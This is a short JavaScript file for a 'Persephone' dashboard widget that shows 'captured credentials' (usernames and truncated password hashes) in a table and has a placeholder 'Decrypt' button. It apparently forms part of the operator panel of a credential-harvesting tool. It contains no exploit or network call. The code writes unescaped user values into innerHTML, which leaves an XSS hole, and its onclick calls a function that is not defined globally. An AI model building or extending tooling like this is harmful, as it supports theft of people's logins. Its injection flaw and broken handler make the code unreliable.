/**
 * 🌸 Encrypted Log Dashboard Widget by Persephone
 * Handles display and potential client-side decryption of captured credentials.
 */

class LogWidget {
    constructor(tableId) {
        this.tableBody = document.querySelector(`#${tableId} tbody`);
    }

    addEntry(timestamp, user, passHash) {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td>${timestamp}</td>
            <td><span class="badge badge-info">${user}</span></td>
            <td class="font-monospace text-muted" title="Encrypted">${passHash.substring(0, 16)}...</td>
            <td>
                <button class="btn btn-sm btn-outline-primary" onclick="decryptEntry('${passHash}')">
                    Decrypt
                </button>
            </td>
        `;
        this.tableBody.prepend(row);
    }

    async decryptEntry(encryptedHex) {
        // Placeholder for client-side decryption logic
        // In a real scenario, this would prompt for a key and use Web Crypto API
        const key = prompt("Enter Decryption Key:");
        if (key) {
            alert("Decryption feature coming soon in Persephone v2.0!");
        }
    }
}

window.logWidget = new LogWidget('credential-table');
